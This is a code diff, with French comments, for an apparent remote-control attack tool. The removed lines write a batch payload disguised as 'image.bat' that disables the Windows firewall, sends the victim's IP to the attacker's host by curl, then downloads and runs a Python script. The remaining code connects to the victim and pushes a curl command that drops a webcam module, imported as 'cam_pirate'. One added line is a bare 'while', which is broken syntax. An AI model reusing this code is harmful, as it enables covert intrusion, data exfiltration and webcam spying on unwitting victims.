@@ -11,44 +11,20 @@ TODO: réorganiser le code
 import socket, sys,time,os,threading,csv
 import payload.cam_pirate as cam
 from colorama import Fore,deinit,init
-from modules.fonctions import get_ip, generation_vecteur, menu
+from modules.fonctions import get_self_ip, generation_vecteur, menu, save_ip, read_victime_ip
 
-def generation(HOST):
-    os.system("del payload/image.bat")
-    fich=open('payload/image.bat','w')
-    msg="NetSh Advfirewall set allprofiles state off\n(for /F \"tokens=16\" %%i in (\'\"ipconfig | findstr IPv4\"\') do (curl -d %%i http://"
-    msg+=HOST+":8888/))\ncurl http://"
-    msg+=HOST+":8000/payload/jeu.pyw -o jeu.py\npython jeu.py"
-    fich.write(msg)
-    fich.close()
-
-def ip():
-    donnees=[]
-    while donnees==[]:
-        fich=open('message.txt','r')
-        c=csv.reader(fich,delimiter=';')
-        donnees=[]
-        for ligne in c:
-            donnees.append(ligne)
-        fich.close
-    return(donnees[0][0])
-
+# Initialisation pour les couleurs
 init()
-menu()
+
+# Recuperation de l'adresse IP hôte
+HOST : str = get_self_ip()
+save_ip(HOST)
+
+# Affichage du menu
+choix :str = menu()
 
 
-HOST = get_ip()
-
-fich=open('selfIp.txt','w')
-fich.write(HOST)
-fich.close()
-print("Nouvelle cible    [1]")
-print("Ancienne cible    [2]")
-a=input(">>> ")
-if a=="1":
-    f=open("message.txt","w")
-    f.write("")
-    f.close()
+if choix=="1":
     try:
         os.system("start /Min servers/server.py")
         os.system("start /Min node servers/server.js")
@@ -59,6 +35,9 @@ if a=="1":
     print("generation du payload...")
     generation_vecteur(HOST)
     print("payload enregistré sous le nom image.bat")
+    fich = open('txt_files/message.txt','w')
+    fich.write("")
+    fich.close()
 
 
 
@@ -66,10 +45,11 @@ print("démarage de l'ecoute")
 mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # mySocket.settimeout(5)
 PORT = 55027
-print("Resverse lisening on ",ip(),"port ",PORT)
+ip_victime = read_victime_ip()
+print("Resverse lisening on ",ip_victime,"port ",PORT)
 while True:
     try:
-        mySocket.connect((ip(), PORT))
+        mySocket.connect((ip_victime, PORT))
         break
     except:
         continue
@@ -86,6 +66,7 @@ while True:
             print("importation des modules ok")
         msg="curl http://"+HOST+":8000/cam.py -o C:\\Users\\Public\\Documents\\cam.pyw"
         mySocket.send(msg.encode("Utf8"))
+        while
         msgServeur = mySocket.recv(1024).decode("Utf8")
         while msgServeur!='ex':
             msgServeur=mySocket.recv(1024).decode("Utf8")
